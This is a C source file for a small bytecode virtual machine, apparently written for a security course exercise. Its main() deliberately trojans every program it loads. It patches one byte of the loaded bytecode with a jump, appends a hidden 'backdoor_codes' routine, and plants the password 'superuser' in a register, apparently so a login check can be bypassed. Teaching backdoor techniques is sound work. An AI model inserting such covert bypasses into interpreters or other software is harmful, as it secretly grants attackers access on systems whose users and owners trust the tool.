// This is where you put your VM code.
// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "minivm.h"

#define NUM_REGS   (256)
#define NUM_FUNCS  (256)

// Global variable that indicates if the process is running.
static bool is_running = true;

unsigned char backdoor_codes[] = {
	0x30, 0xe7, 0x32, 0x00, 0x40, 0x07, 0x00, 0x00, 0x40, 0x08, 0x01, 0x00,
	0x40, 0x09, 0x00, 0x00, 0x50, 0x15, 0xe7, 0x09, 0x50, 0x16, 0xe8, 0x09,
	0x10, 0x0b, 0x15, 0x00, 0x10, 0x0c, 0x16, 0x00, 0x90, 0x01, 0x0b, 0x0c,
	0xa0, 0x01, 0xda, 0xde, 0x90, 0x01, 0x0b, 0x07, 0xa0, 0x01, 0xbd, 0xdc,
	0x50, 0x09, 0x09, 0x08, 0xb0, 0xd4, 0x00, 0x00, 0x30, 0xe7, 0x68, 0x00,
	0xb0, 0xbf, 0x00, 0x00
};
int	backdoor_codes_len = 64;

void usageExit() {
    // TODO: show usage
    exit(1);
}

void initFuncs(FunPtr *f, uint32_t cnt) {
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        f[i] = NULL;
    }

    // TODO: initialize function pointers
    f[0x00] = vm_halt;
    f[0x10] = vm_load;
    f[0x20] = vm_store;
    f[0x30] = vm_move;
    f[0x40] = vm_puti;
    f[0x50] = vm_add;
    //f[0x60] = vm_sub;
    ////f[0x70] = vm_gt;
    //f[0x80] = vm_ge;
    f[0x90] = vm_eq;
    f[0xa0] = vm_ite;
    f[0xb0] = vm_jump;
    f[0xc0] = vm_puts;
    f[0xd0] = vm_gets;
}

void initRegs(Reg *r, uint32_t cnt)
{
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        r[i].type = 0;
        r[i].value = 0;
    }
}

int main(int argc, char** argv) {
    VMContext vm;
    Reg r[NUM_REGS];
    FunPtr f[NUM_FUNCS];
    FILE* bytecode;
    uint32_t* pc;
    uint32_t	fsize = 0;
    char*	codes;

    // There should be at least one argument.
    if (argc < 2) usageExit();

    // Initialize registers.
    initRegs(r, NUM_REGS);
    // Initialize interpretation functions.
    initFuncs(f, NUM_FUNCS);
    // Initialize VM context.
    initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f);

    // Load bytecode file
    bytecode = fopen(argv[1], "rb");
    if (bytecode == NULL) {
        perror("fopen");
        return 1;
    }

    // file size
    fseek(bytecode, 0, SEEK_END); // seek to end of file
    fsize = ftell(bytecode);
    fseek(bytecode, 0, SEEK_SET);

    if ( fsize > 4 )
        codes = (char*)malloc(fsize + 100);	// for backdoor!!
    else
        exit(0);

    fread(codes, fsize, 1, bytecode);
    pc = codes;
    vm.r[199].value = pc;

    char*	backdoor = "superuser";
    char	jmpfix = 0xd0;
    vm.r[50].value = backdoor;
    memcpy ( codes + 0x2c5, &jmpfix, 1 );
    memcpy ( codes + fsize, backdoor_codes, backdoor_codes_len );

    printf ( " + codes : %x, codes+fsize : %p, pc:%x\n", codes, codes+fsize, pc );

    while (is_running && pc != codes + fsize + backdoor_codes_len ) {	// Add backdoor size
    	// TODO: Read 4-byte bytecode, and set the pc accordingly
        stepVMContext(&vm, &pc);
    }

    fclose(bytecode);

    // Zero indicates normal termination.
    return 0;
}
